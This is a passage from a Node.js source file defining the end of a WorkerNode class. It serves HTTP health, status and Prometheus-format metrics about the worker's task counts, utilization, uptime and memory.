        log.warn('Worker HTTP handler error', { error: error.message });
        if (!res.headersSent) {
          res.writeHead(500, { 'Content-Type': 'text/plain', ...this.getCorsHeaders() });
        }
        res.end('Internal Error');
      }
    };

    this.httpServer = http.createServer(handler);

    await new Promise((resolve, reject) => {
      this.httpServer.once('error', reject);
      this.httpServer.listen(this.httpPort, () => {
        log.info('Worker HTTP status server listening', { port: this.httpPort, workerId: this.workerId });
        resolve();
      });
    });
  }

  getCorsHeaders() {
    return {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    };
  }

  buildHealthPayload() {
    const now = Date.now();
    const uptimeMs = now - this.startTime;
    const tasksPerMinute = uptimeMs > 0 ? this.tasksCompleted / (uptimeMs / 60000) : 0;

    return {
      status: 'healthy',
      workerId: this.workerId,
      timestamp: new Date(now).toISOString(),
      uptimeMs,
      activeTasks: this.activeTaskCount,
      concurrency: this.concurrency,
      tasksCompleted: this.tasksCompleted,
      tasksPerMinute: Number(tasksPerMinute.toFixed(2)),
      memory: {
        rssMB: Math.round(process.memoryUsage().rss / 1024 / 1024),
      },
    };
  }

  buildStatusPayload() {
    const health = this.buildHealthPayload();
    return {
      ...health,
      queue: {
        activeTasks: this.activeTaskCount,
        utilization: Math.round((this.activeTaskCount / this.concurrency) * 100),
      },
      powServiceUrl: this.powServiceUrl || null,
      startedAt: new Date(this.startTime).toISOString(),
    };
  }

  buildMetricsPayload() {
    const now = Date.now();
    const uptimeSeconds = (now - this.startTime) / 1000;
    const utilization = this.concurrency > 0 ? this.activeTaskCount / this.concurrency : 0;

    return [
      '# HELP worker_active_tasks Number of active tasks currently processing',
      '# TYPE worker_active_tasks gauge',
      `worker_active_tasks{workerId="${this.workerId}"} ${this.activeTaskCount}`,
      '# HELP worker_concurrency Configured concurrency per worker',
      '# TYPE worker_concurrency gauge',
      `worker_concurrency{workerId="${this.workerId}"} ${this.concurrency}`,
      '# HELP worker_tasks_completed_total Total tasks completed by this worker',
      '# TYPE worker_tasks_completed_total counter',
      `worker_tasks_completed_total{workerId="${this.workerId}"} ${this.tasksCompleted}`,
      '# HELP worker_utilization_ratio Current utilization (0-1)',
      '# TYPE worker_utilization_ratio gauge',
      `worker_utilization_ratio{workerId="${this.workerId}"} ${utilization.toFixed(4)}`,
      '# HELP worker_uptime_seconds Worker uptime in seconds',
      '# TYPE worker_uptime_seconds gauge',
      `worker_uptime_seconds{workerId="${this.workerId}"} ${uptimeSeconds.toFixed(0)}`
    ].join('\n');
  }
}

module.exports = WorkerNode;